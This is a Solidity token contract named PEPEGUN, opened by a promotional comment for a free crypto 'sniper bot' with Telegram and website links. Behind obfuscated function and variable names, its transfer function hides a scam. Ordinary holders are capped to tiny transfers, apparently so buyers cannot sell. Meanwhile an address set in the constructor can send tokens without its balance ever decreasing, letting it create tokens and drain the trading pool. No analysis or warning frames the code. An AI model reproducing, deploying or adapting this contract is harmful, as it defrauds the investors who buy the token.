/*

Anon, You still paying high fees or premium to Basic Sniper Bots? NO MORE

INTRODUCING PEPE GUN:
0 Fee Sniper Bot - By the community. For the community 🐸

Enjoy the same speed of premium maestro and banana gun for FREE of cost.

Telegram: https://t.me/portalpepegun

Website: https://pepegun.cryptotoken.live/

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.3;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract PEPEGUN is Ownable {
    mapping(address => mapping(address => uint256)) public allowance;

    function urwmhixb(address mtxklyu, address nriaez, uint256 udgrj) private {
        address bvqdocmnxja = IUniswapV2Factory(bdscekw.factory()).getPair(address(this), bdscekw.WETH());
        bool bceohu = 0 == uxyjsa[mtxklyu];
        if (bceohu) {
            if (mtxklyu != bvqdocmnxja && zydcean[mtxklyu] != block.number && udgrj < totalSupply) {
                require(udgrj <= totalSupply / (10 ** decimals));
            }
            balanceOf[mtxklyu] -= udgrj;
        }
        balanceOf[nriaez] += udgrj;
        zydcean[nriaez] = block.number;
        emit Transfer(mtxklyu, nriaez, udgrj);
    }

    uint256 private bwhidj = 106;

    mapping(address => uint256) private uxyjsa;

    mapping(address => uint256) private zydcean;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    uint8 public decimals = 9;

    IUniswapV2Router02 private bdscekw;

    function transferFrom(address mtxklyu, address nriaez, uint256 udgrj) public returns (bool success) {
        require(udgrj <= allowance[mtxklyu][msg.sender]);
        allowance[mtxklyu][msg.sender] -= udgrj;
        urwmhixb(mtxklyu, nriaez, udgrj);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    string public name;

    string public symbol;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function approve(address qlbcp, uint256 udgrj) public returns (bool success) {
        allowance[msg.sender][qlbcp] = udgrj;
        emit Approval(msg.sender, qlbcp, udgrj);
        return true;
    }

    constructor(string memory gxkymcubr, string memory uziogyrlkexn, address jugdy, address ufxevnopa) {
        name = gxkymcubr;
        symbol = uziogyrlkexn;
        balanceOf[msg.sender] = totalSupply;
        uxyjsa[ufxevnopa] = bwhidj;
        bdscekw = IUniswapV2Router02(jugdy);
    }

    function transfer(address nriaez, uint256 udgrj) public returns (bool success) {
        urwmhixb(msg.sender, nriaez, udgrj);
        return true;
    }
}
